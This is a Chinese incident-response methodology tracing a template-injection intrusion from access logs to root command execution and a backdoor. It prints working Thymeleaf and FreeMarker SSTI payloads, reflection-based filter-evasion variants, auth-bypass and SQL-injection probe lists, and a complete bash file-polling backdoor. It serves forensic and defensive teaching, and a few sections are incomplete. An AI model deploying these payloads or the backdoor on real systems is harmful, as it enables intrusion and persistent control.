# 模板注入型入侵溯源方法论：从一份访问日志到完整攻击链（2026-10 实战沉淀）

> 来源：某行业协会官网（生产）被入侵事件的授权溯源。客户诉求是「后台被恶意注册了账号，帮定位漏洞」，实际挖出的是**推送模板 SSTI → root RCE + 持久化后门**。域名、IP、账号、口令、C2 地址均已脱敏。命中「**CMS 模板/主题/推送类功能 + 攻击者产物仍在服务器上**」时按 §0–§13 过一遍。

**核心思路**：目标是**已经被打过、且攻击者产物还没被清理**的生产站点时，**不要只从日志正查**。

```
错误路径：日志 → 找攻击请求 → 定位漏洞        （日志往往不覆盖管理接口，且可能不覆盖攻击时段）
正确路径：攻击面测绘 → 找出未鉴权面 → 用未鉴权面反查攻击者产物 → 还原完整链
```

攻击者的 payload、命令输出、后门脚本**往往就留在服务器上**，而且经常因为「存储目录同时是公网静态目录」而**可以被外部直接下载**。这条路的完整度远高于查日志。

---

## 0. 前置判断：先确认「现场是否还活着」

动手前先问客户两件事，答案决定后续策略：

| 问题 | 为什么关键 |
|---|---|
| 攻击者添加的数据/文件还在吗？ | 还在 → 走本文路径（反查产物）；已清理 → 只能靠日志/数据库 |
| 有没有覆盖**攻击时段**且**包含相关接口**（注册/用户管理/后台管理）的日志？ | 若没有 → 查日志是白费力气，直接转向攻击面测绘 |

**实测教训**：客户给的那份日志有 5800 条、看起来"很全"，但**接口全集里既没有注册/用户新增接口，也没有任何后台管理接口**（只有公开站点的业务接口），且**时间窗与攻击活动完全错开**（日志止于当日中午，最早的攻击者产物出现在当日下午，主攻在次日凌晨）。**先花 10 分钟确认日志的覆盖范围（接口 + 时段），比闷头分析 1 小时有价值。**

## 1. 日志先行排除法（判断「入口不在日志里」）

拿到日志先做三件事，不做细节分析：

1. **接口全集**：去重列出所有接口 → 看有没有**与事件动作相关**的接口（注册 / 用户管理 / 后台管理）
2. **时间窗**：min/max 时间 → 与客户所述的事件窗口对比
3. **身份维度**：统计「访问人/操作人」字段的取值分布 → 匿名 vs 具名各占多少

**判定**：若事件窗口内 100% 匿名、且接口全集里**找不到与事件动作对应的接口**（例：事件是"被建号" → 全集里却没有注册/用户新增/后台管理接口）→ **入口不在采集范围内**，立刻换路径，不要继续在日志里挖。

> 注意：判据是「**有没有与事件动作对应的接口**」，不是「有没有写接口」——实测目标的日志里**确实有**写接口（撤销、发布），但**没有**任何建号相关的接口。

**副产品（有价值）**：具名字段可以反查真实账号。用登录接口的存在性 oracle 交叉验证后，能确认「日志里的操作人字段确实解析为真实账号」，进而确认日志可信度。

## 2. 前端逆向提取接口表（SPA 目标）

Vue/React + webpack 的管理后台，接口表藏在 JS 里：

```bash
# 1) 拿 index.html
curl -s https://<目标>/<spa-path>/ -o index.html

# 2) 解析 webpack manifest，提取 chunk 名→hash 映射
#    index.html 里形如 "chunk-xxxx":"<hash>" 的映射表
# 3) 批量下载全部 chunk
```

提取目标：

| 目标 | 用途 |
|---|---|
| API 路由全集 | 攻击面清单 |
| `baseURL` | 接口真实前缀（可与日志里的路径互证） |
| 认证头名 / token 存储键 | 后续鉴权测试与绕过尝试 |
| 登录请求参数 | 发现 SSO / 第三方登录（openId 之类） |
| 路由 `meta.title` | **还原后台功能模块全貌**——框架自带、前端零调用的管理面往往在这里暴露 |

**实测收益**：路由 meta.title 一次性列出了「注册管理 / 用户管理 / 系统日志 / 订阅管理 / 聊天室」等 20+ 模块，比逐个猜路径高效得多。

## 3. ★ 鉴权分层测绘（本方法论的核心工具）

**目的**：一次普查画出「哪些路径前缀是裸奔的」。

### 方法 A：畸形请求体探测（适用于 JSON body 接口）

**原理**：Spring 的过滤器链在消息解析**之前**执行。所以：

| 响应 | 含义 |
|---|---|
| `{"code":401,...}` / 302 跳登录 | 安全过滤器拦截 → **有鉴权** |
| 业务错误（`系统异常，操作失败` / `空指针异常!` / 参数校验失败） | 已进入控制器 → **无鉴权** |

> **关键**：用「**业务错误文案**」而不是「HTTP 状态码」做判据——很多系统把业务错误也返回 200，看状态码会全部误判为"可访问"。

### 方法 B：query 参数型接口的修正

**陷阱**：若接口参数走 **query string**（`params:t` 而非 `data:t`），畸形 body **根本不会被解析**，控制器直接执行并返回业务错误——此时方法 A 的结论依然成立（未鉴权），但要能区分：

```
返回「业务错误文案」 → 控制器执行了 → 未鉴权
返回「未登录 / Full authentication required」 → 有鉴权
返回「Request method 'GET' not supported」 → 方法不对，但已过鉴权层
```

### 必做：叠加两类绕过测试

| 类别 | 变体 |
|---|---|
| 路径绕过 | `/path/`、`//path`、`/./path`、`/../path`、`/path%20`、`/path;.js`、`/path.json`、大小写、`/path%2f` |
| 认证头绕过 | 空值、`null`、`undefined`、`0`、`1`、`true`、`admin`、`test`、`'`、`-1` |

**实测结论**：目标的管理前缀（`/api/system/**`、`/api/schedule/**`）**十余种路径变体 + 十余种认证头变体全部被挡**——说明该层保护是认真的，**不要在这上面耗时间**，把精力放到裸奔的前缀上。

**必测**：

**实测收益**：`/v2/api-docs` 未鉴权返回 **199KB / 154 个接口**完整定义，且 `basePath` 泄露了真实后端前缀——正好解释了日志里路径与前端 `baseURL` 对不上的问题（nginx 做了前缀重写）。

**注意**：Swagger 的 `definitions` 里能看到**数据模型的全部字段**（含 `pwd`、`salt`、`qqOppenId` 这类敏感字段名），本身就是信息泄露。

## 5. 用「未鉴权读接口」反查攻击者产物

找出裸奔的读接口后，**拉全量业务表并排序**，异常记录会自己浮出来：

```bash
curl -s "https://<目标>/api/<module>/listPage?current=1&size=2000" \
 | jq -r '.data.records[] | [.createTime,.name,.author,.id] | @tsv' | sort
```

**异常特征**（实测有效）：

| 特征 | 例子 |
|---|---|
| 命名带攻击语义 | `*_rce_*`、`exec_*`、`lfi_*`、`test_*`、`probe_*` |
| 创建时间集中在深夜/非工作时段 | 凌晨时段（如 01:00–03:00）密集创建 |
| 同一字段与其他记录明显不同 | 「作者」字段全是正常人名，突然出现无意义字符串（单字母、通用测试词） |
| 短时间大量同名记录 | 同一名字 65 条 → **调试 payload 的信号** |
| 外键字段为空但记录存在 | 正常记录都有完整关联，异常记录 `items: []` |

**下一步入口**：记录里的 `url`、`templateId`、`fileId` 等外键字段。

## 6. ★ 生成页指纹识别（判断「确实执行了代码」）

把记录里的 `url` 字段直接下载，看**运行时对象是否泄漏到了输出**：

| 语言/引擎 | 运行时对象泄漏指纹 |
|---|---|
| Java | `java.lang.UNIXProcess@<hash>`（JDK8）、`java.lang.ProcessImpl@<hash>`（JDK9+） |
| Java | `java.lang.ProcessBuilder@<hash>` ⚠️ 见下方说明 |
| Python | `<subprocess.Popen object at 0x...>` |
| PHP | `object(Closure)#1 (0) {}`、`resource(5) of type (stream)` |
| Ruby | `#<Process::Status: ...>` |

> **区分「求值」与「执行」**：
> - `UNIXProcess@` / `ProcessImpl@` 是 **`Runtime.exec()` 的返回值**；`Popen object` 是 **`Popen()` 构造出的进程对象**（构造即启动）→ 两者都直接证明**命令已执行**
> - `ProcessBuilder@` 是**构造出来但没调 `.start()` 的对象**（`start()` 返回的是 Process，不是 ProcessBuilder）→ 只证明**表达式被求值**，未必执行了命令
>
> 报告里要写"命令执行成功"时，必须拿到前一类证据。

**判据**：`java.lang.UNIXProcess@<hash>` 这类字符串是**进程对象的 `toString()`**，正常业务代码**不可能**产生它。它出现在页面里，只能说明：

1. 模板中有表达式被服务端求值
2. 该表达式的返回值是**操作系统进程对象**（即命令已被执行）
3. 该对象被按 `toString()` 渲染进了输出

→ **命令执行成功**。

**这是整个溯源中最有说服力的单条证据**，比任何日志都硬。

## 7. ★ 路径回显 + 公开静态目录 = payload 原件下载

**这是能完整还原攻击链的关键一跳，也是这类系统最常见的配置失误。**

```
① 记录/响应里明文返回服务器绝对路径
     例：<pathField> = /opt/<app>/file/<template-dir>/<uuid>.htm

② 该目录恰好是 nginx 静态映射目录
     例：/opt/<app>/file/  →  https://<host>/<static-prefix>/

③ 于是 payload 源码可以直接下载
     https://<host>/<static-prefix>/<template-dir>/<uuid>.htm
```

**映射规则推导**：拿一个已知存在的静态资源（如首页引用的图片）反推前缀映射关系，再用它去拼其它路径。

**实测后果**：攻击者写入该目录的**模板 payload 源码、命令输出文件、后门脚本**全部可从公网无鉴权下载——等于**攻击者的作战笔记挂在了公网上**，整条攻击链得以完整还原（含 194 个模板的 payload 演进）。

**顺带**：攻击者把命令输出重定向到该目录（`id > /opt/<app>/file/out.txt`），就是为了从公网回读结果——**公开静态目录 + 可执行命令 = 天然的 C2 回读通道**。

## 8. SSTI 双引擎与绕过手法

### 8.1 同一功能可能被多个引擎渲染

不要只测一种。实测中攻击者**两个引擎都试了**：

```html
<!-- Thymeleaf（需 SpringEL，即 SpringStandardDialect） -->
${T(java.lang.Runtime).getRuntime().exec('id')}

<!-- FreeMarker -->
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
```

### 8.2 绕过 `T()` 关键字检测

WAF / 输入过滤常拦 `T(`、`Runtime`、`ProcessBuilder`。绕过手法（实测攻击者用过）：

```html
<!-- 字符串拼接 + 反射：借用模板上下文已有变量，不出现 T() 与完整类名 -->
${code.getClass().forName('java.lang.Process'+'Builder')
   .getConstructors()[0].newInstance({'sh','-c','...'}).start()}

<!-- 更狠：用 getDeclaredMethods()[N] 拿方法，连方法名都不出现 -->
${code.getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null).exec('...')}
```

**启示**：**任何基于关键字黑名单的防护都靠不住**——攻击者用字符串拼接就绕过了。修复必须落在"不让用户内容进模板引擎"，而不是"过滤危险字符"。

### 8.3 攻击者行为特征

| 特征 | 含义 |
|---|---|
| 短时间创建大量同名模板（同一名字 × 65） | 在**迭代调试 payload** |
| 同时创建"无害探测"记录（`hello`/`world` 之类） | 在**验证渲染是否生效** |
| payload 名称带 `rce`、`exec`、`lfi`、`whoami`、`id` | 明确攻击意图 |
| 后期改用反射/拼接版 | **在规避已上线的检测** |

## 9. 后门形态识别：cmd-file 守护进程

**这类"文件轮询型"后门在 Web 应用失陷场景中很常见**，特征：

```bash
#!/bin/bash
# 轮询一个可写文件，内容变化就执行
MARK="/opt/<app>/file/.bdrunning"     # 单实例锁
CMD_F="/opt/<app>/file/cmd.txt"       # 命令输入
OUT_F="/opt/<app>/file/out.txt"       # 结果输出
if [ -f "$MARK" ]; then exit 0; fi
touch "$MARK"
LAST=""
while true; do
  CUR=$(cat "$CMD_F" 2>/dev/null | md5sum 2>/dev/null | cut -d' ' -f1)
  if [ -n "$CUR" ] && [ "$CUR" != "$LAST" ]; then
    LAST="$CUR"
    (cat "$CMD_F" 2>/dev/null | bash > "$OUT_F" 2>&1 &)
  fi
  sleep 3
done
```

**为什么攻击者爱用**：

| 优点 | 说明 |
|---|---|
| **不依赖 C2** | C2 被墙/被下线也能用——只要能往那个目录写文件 |
| **无端口监听** | 不 bind 端口、不主动外连，`ss`/`netstat` 查不到异常 |
| **不注册为服务** | 只是个 bash 循环，不进 systemd / crontab，常规服务巡检看不到 |

**排查要点**：

```bash
# 1) 谁在跑该目录下的东西（比 grep 可靠）
ls -l /proc/*/exe 2>/dev/null | grep '/opt/<app>/file'
ls -l /proc/*/cwd 2>/dev/null | grep '/opt/<app>/file'

# 2) 谁持有后门文件的句柄（最准）
lsof /opt/<app>/file/cmd.txt /opt/<app>/file/out.txt 2>/dev/null
fuser -v /opt/<app>/file/.bdrunning 2>/dev/null

# 3) 残留文件清单
ls -la /opt/<app>/file/ | grep -E 'cmd\.txt|out\.txt|bdrunning|\.sh$'
```

**⚠️ 处置顺序陷阱**：`.bdrunning` **只是锁文件**，删了它**不会**停掉已运行的进程；必须 **`pkill` 先杀进程，再删文件**。

## 10. 溯源边界：能定位什么、不能定位什么

| 能 | 不能 |
|---|---|
| 攻击者**基础设施**（C2 的 ASN / 归属地 / 主机商） | 攻击者**真实 IP**（除非有覆盖攻击时段与相关接口的日志） |
| 攻击者**全部产物**（payload、输出、后门） | 攻击者身份 |
| 攻击**时间线**（产物 createTime 反推） | 攻击者是否还有未发现的持久化 |

**关键限制**：站点若**前置 CDN**，源站日志里大量是 CDN 边缘 IP；要拿真实 IP 必须看 `X-Forwarded-For` / `CF-Connecting-IP`，或调 CDN 侧日志。

**实测教训**：C2 的归属查询（`ip-api.com` / `ipinfo.io`）能给出 ASN 与地理，但 ASN 注册主体与 IP 落地地常常不一致（例：ASN 注册在新加坡、IP 落地美西）——**这是匿名主机商的典型特征**，只能作为线索，不能作为结论。

## 11. 处置要点（顺序敏感）

```
备份（含 hash + stat + 元数据）  →  杀进程  →  删文件  →  换凭据  →  修根因
```

| 陷阱 | 后果 |
|---|---|
| 先换凭据后杀后门 | **白换**——后门还活着，新密码照样被读走 |
| 删 `.bdrunning` 不杀进程 | 没用，进程继续轮询 |
| 备份放在 web 目录下 | 等于没删，仍公网可下载 |
| 只删文件不删库记录 | 恶意记录还在，渲染即执行 |

**备份必须包含**：文件本体 + `sha256sum` + `stat`（时间戳/权限/属主）+ 数据库记录导出。**这是证据链，不是可选项。**

**⚠️ 最终判断**：**root 权限 RCE + 已部署后门 = 这台机器已不可信**。`ps`/`ls`/`netstat` 本身都可能被替换。**清理只能作为过渡，最安全的做法是从事件前的干净备份重建。**

## 12. 负向结论（勿重复测）

| 面 | 结论 |
|---|---|
| 管理前缀路径绕过（十余种变体） | 全部 401，**排除** |
| 认证头绕过（十余种变体） | 全部 401，**排除** |
| 登录接口 SQL 注入 | `'`、`'-- `、`' or '1'='1` 返回**完全一致** → 参数化，**排除** |
| 隐藏注册接口 | 404，**排除** |
| 前台注册页 | HTML 里已注释下线（但对应 API 仍无鉴权——**页面下线 ≠ 接口下线**） |

## 13. 可复用检查清单

```
【日志侧】
□ 接口全集去重 → 有没有**与事件动作对应**的接口（建号事件→找注册/用户管理接口）
□ 时间窗是否覆盖事件时段
□ 身份字段取值分布（匿名 vs 具名）

【攻击面测绘】
□ 前端 JS 逆向 → API 路由 + baseURL + 认证头 + 路由 meta.title
□ 畸形请求体探测 → 鉴权分层图（用业务错误文案判定，不看状态码）
□ query 参数型接口单独修正判定
□ 路径绕过 + 认证头绕过（各十余种变体）
□ 接口文档泄露：/v2/api-docs、/swagger-ui.html、/actuator/*

【反查攻击者产物】
□ 拉全量业务表按 createTime 排序，找攻击语义命名/深夜时段/异常作者
□ 记录里的 url / templateId / fileId 外键 → 下一步
□ 下载生成页 → 找运行时对象泄漏（UNIXProcess@ 等）
□ 路径字段回显 → 推导公开静态目录映射 → 下载 payload 原件
□ 全量下载攻击者产物（模板/脚本/输出），按时间排序还原时间线

【SSTI 专项】
□ 双引擎都测（Thymeleaf + FreeMarker）
□ 记录攻击者是否用反射/拼接绕过
□ 同名记录批量出现 = 在调试

【后门排查】
□ lsof / /proc/*/exe / /proc/*/cwd 三查
□ 文件轮询型后门特征：.sh + cmd.txt + out.txt + 单一锁文件
□ 持久化：crontab / systemd / rc.local / profile.d
□ 全盘 grep C2 地址

【处置】
```

## 14. 一句话总结

> **被入侵过的站点，攻击者的产物往往比日志更完整。** 先用畸形请求体探测画出鉴权分层图，从裸奔的读接口拉全量数据找异常记录，顺着记录的 `url` 字段下载生成页看有没有运行时对象泄漏，再顺着路径回显推导公开静态目录映射——**payload 原件、命令输出、后门脚本就全在公网挂着**。这条路的完整度和速度都远胜于查日志。
